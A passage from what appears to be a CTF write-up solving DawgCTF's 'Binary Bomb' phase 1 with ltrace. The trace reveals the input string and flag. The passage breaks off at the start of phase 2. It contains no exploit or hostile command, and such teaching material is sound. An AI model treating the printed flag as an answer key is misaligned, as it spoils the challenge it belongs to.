&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sysconf&lt;&#x2F;span&gt;&lt;span&gt;(30, 0x7fff11d7a628, 0x7fff11d7a638, 0x5593c3601dc0) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;4096
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mprotect&lt;&#x2F;span&gt;&lt;span&gt;(0x5593c35fb000, 389, 7, 389)                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getppid&lt;&#x2F;span&gt;&lt;span&gt;()                                            = 27043
&lt;&#x2F;span&gt;&lt;span&gt;snprintf(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&#x2F;proc&#x2F;27043&#x2F;status&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; 24, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&#x2F;proc&#x2F;%d&#x2F;status&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 27043) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;18
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;fopen&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&#x2F;proc&#x2F;27043&#x2F;status&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;r&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)                     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x5593c3c032a0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;fgets&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Name:\tltrace\n&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 16, 0x5593c3c032a0)         &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x7fff11d7a580
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;fclose&lt;&#x2F;span&gt;&lt;span&gt;(0x5593c3c032a0)                               &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strstr&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Name:\tltrace\n&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;gdb&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)                     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;nil
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strstr&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Name:\tltrace\n&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;ltrace&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)                  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;ltrace\n&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;(0)                                              &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;1682156350
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;srand&lt;&#x2F;span&gt;&lt;span&gt;(0x6443ab3e, 0x5593c35fe022, 0, 0)              &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rand&lt;&#x2F;span&gt;&lt;span&gt;(0xffffffff, 0x7f41b6e19860, 0x7f41b6e19204, 0x7f41b6e19280) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x3ee147ca
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;(0)                                              &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;1682156350
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;srand&lt;&#x2F;span&gt;&lt;span&gt;(0x6443ab3e, 0x7fff11d7a628, 0, 0x5593c3601dc8) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setlocale&lt;&#x2F;span&gt;&lt;span&gt;(LC_ALL, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)                                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;en_IN&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sigaction&lt;&#x2F;span&gt;&lt;span&gt;(SIGINT, { 0x5593c35fd707&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; &amp;lt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; 0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; 0 }, nil) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Welcome to the DawgCTF Binary Bo&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;...Welcome to the DawgCTF Binary Bomb!
&lt;&#x2F;span&gt;&lt;span&gt;)          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;36
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Type HELP for help.&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)                        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;19
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;\033[33m\ns\n\033[0m&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Starting off with small strings.&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;...Type HELP for help.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Starting&lt;&#x2F;span&gt;&lt;span&gt; off with small strings...
&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;45
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter round %d input: &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 1)                  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;21
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getline&lt;&#x2F;span&gt;&lt;span&gt;(0x7fff11d7a3f8, 0x7fff11d7a400, 0x7f41b6e19aa0, 0x7fff11d7a400Enter round 1 input: pass
&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;5
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;realloc&lt;&#x2F;span&gt;&lt;span&gt;(0, 5)                                        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x5593c3c04e70
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncpy&lt;&#x2F;span&gt;&lt;span&gt;(0x5593c3c04e70, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;pass&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 5)                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x5593c3c04e70
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;pass&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;SKIP&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 4)                           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;29
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;pass&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;HELP&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 4)                           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;40
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;pass&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;BabYs_F1rS7_RE&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 4)                 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;46
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rand&lt;&#x2F;span&gt;&lt;span&gt;(1, 0x5593c35fe1dc, 0, 66)                       &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x3ee147ca
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;calloc&lt;&#x2F;span&gt;&lt;span&gt;(160, 1)                                       &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x5593c3c04e90
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sprintf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Round 1 EXPLODED!&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Round %d EXPLODED!&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 1) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;17
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;\033[31m%s\n\033[0m&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Round 1 EXPLODED!&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;Round 1 EXPLODED!
&lt;&#x2F;span&gt;&lt;span&gt;)   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;27
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;free&lt;&#x2F;span&gt;&lt;span&gt;(0x5593c3c04e90)                                 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;\033[33m\n%s\n\033[0m&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Starting off with small strings.&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;...
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Starting&lt;&#x2F;span&gt;&lt;span&gt; off with small strings...
&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;45
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter round %d input: &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 1)                  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;21
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getline&lt;&#x2F;span&gt;&lt;span&gt;(0x7fff11d7a3f8, 0x7fff11d7a400, 0x7f41b6e19aa0, 0x7fff11d7a400Enter round 1 input: BabYs_F1rS7_RE
&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;15
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;realloc&lt;&#x2F;span&gt;&lt;span&gt;(0x5593c3c04e70, 15)                          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x5593c3c04e70
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncpy&lt;&#x2F;span&gt;&lt;span&gt;(0x5593c3c04e70, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;BabYs_F1rS7_RE&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 15)        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x5593c3c04e70
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;BabYs_F1rS7_RE&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;SKIP&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 14)                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-17
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;BabYs_F1rS7_RE&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;HELP&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 14)                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-6
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;BabYs_F1rS7_RE&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;BabYs_F1rS7_RE&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 14)      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strlen&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;BabYs_F1rS7_RE&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)                             &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;14
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rand&lt;&#x2F;span&gt;&lt;span&gt;(1, 0x5593c35fe1dc, 0x4000, 476)                 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x578116f8
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;calloc&lt;&#x2F;span&gt;&lt;span&gt;(100, 1)                                       &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x5593c3c04f40
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sprintf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Defused phase 1&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Defused phase %d&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 1)    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;15
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;\033[32m%s\n\033[0m&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Defused phase 1&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;Defused phase 1
&lt;&#x2F;span&gt;&lt;span&gt;)     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;25
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;free&lt;&#x2F;span&gt;&lt;span&gt;(0x5593c3c04f40)                                 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;\033[35mFlag: DawgCTF{s}\n\033[0m&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;BabYs_F1rS7_RE&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;Flag: DawgCTF{BabYs_F1rS7_RE}
&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;39
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;\033[33m\n%s\n\033[0m&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Can you help me? I lost my key a&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;...
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Can&lt;&#x2F;span&gt;&lt;span&gt; you help me&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;?&lt;&#x2F;span&gt;&lt;span&gt; I lost my key and can&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;t read my string
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;) = 66
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;printf(&amp;quot;Enter round %d input: &amp;quot;, 2)                  = 21
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;getline(0x7fff11d7a3f8, 0x7fff11d7a400, 0x7f41b6e19aa0, 0x7fff11d7a400Enter round 2 input: 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;printf(&quot;Enter round %d input: &quot;, 1)&lt;&#x2F;code&gt; For this I entered a test value &lt;code&gt;pass&lt;&#x2F;code&gt; Then I observer in ltrace that it is compared with &lt;code&gt;BabYs_F1rS7_RE&lt;&#x2F;code&gt; If the input matched with &lt;code&gt;BabYs_F1rS7_RE&lt;&#x2F;code&gt; The program is going to print the flag for us. So I inputted the &lt;strong&gt;BabYs_F1rS7_RE&lt;&#x2F;strong&gt; and got the flag.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : DawgCTF{BabYs_F1rS7_RE}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;binary-bomb-phase-2&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#binary-bomb-phase-2&quot; aria-label=&quot;Anchor link for: binary-bomb-phase-2&quot;&gt;Binary Bomb Phase 2&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_binarybomb2.png&quot; alt=&quot;BB2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached File : &lt;a href=&quot;https:&#x2F;&#x2F;drive.google.com&#x2F;drive&#x2F;folders&#x2F;18swPwtmBfTU-9-5onuzlX52JCSUJQf3F&quot; target=_blank&gt;dawg bbomb&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I used the &lt;code&gt;ltrace&lt;&#x2F;code&gt; to execute this binary file again and It prompted for the first round input I already solved it so by giving it to the program we can move to next phase or we can use &lt;code&gt;SKIP&lt;&#x2F;code&gt; to move to the next phase.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;Desktop&#x2F;CYBER&#x2F;CTF&#x2F;CTFTime&#x2F;17_DawgCTF&#x2F;binary_bomb&#x2F;phase-2$&lt;&#x2F;span&gt;&lt;span&gt; ltrace .&#x2F;dawg_bbomb 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Enter&lt;&#x2F;span&gt;&lt;span&gt; round 2 input: pass
&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;5
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;realloc&lt;&#x2F;span&gt;&lt;span&gt;(0x559057ff4e70, 5)                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x559057ff4e70
